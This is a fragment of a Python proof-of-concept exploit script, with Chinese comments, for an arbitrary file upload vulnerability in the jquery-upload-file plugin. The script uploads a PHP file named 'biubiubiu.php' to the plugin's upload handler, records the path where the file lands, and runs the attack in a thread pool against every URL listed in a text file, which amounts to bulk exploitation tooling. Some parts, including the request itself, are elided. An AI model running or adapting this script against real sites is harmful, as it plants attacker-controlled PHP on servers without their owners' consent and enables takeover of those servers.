...
def jquery_upload_file(url):
    global vul_info
    pocdict = {
        "vulnname":"jquery-upload-file任意文件上传漏洞",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        ...
        "vul_level":"2",#高危
        "vul_type":"28",#文件上传
        "vul_exp_script":"jquery-upload-file_exp.py"
    }
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36",
    }
    files = {"myfile" : ("biubiubiu.php", open("biubiubiu.php"), "application/octet-stream")}
    try:
        ...
        print(e)
    #jquery-upload-file/php/uploads/biubiubiu.php
...
if __name__ == '__main__':
    ...
    with open('url.txt',errors='ignore',encoding="utf-8") as f:
        ...
        for url in lines:
            url = url.replace("\n","")
            url_list.append(url)
    pool.map( jquery_upload_file,url_list)    
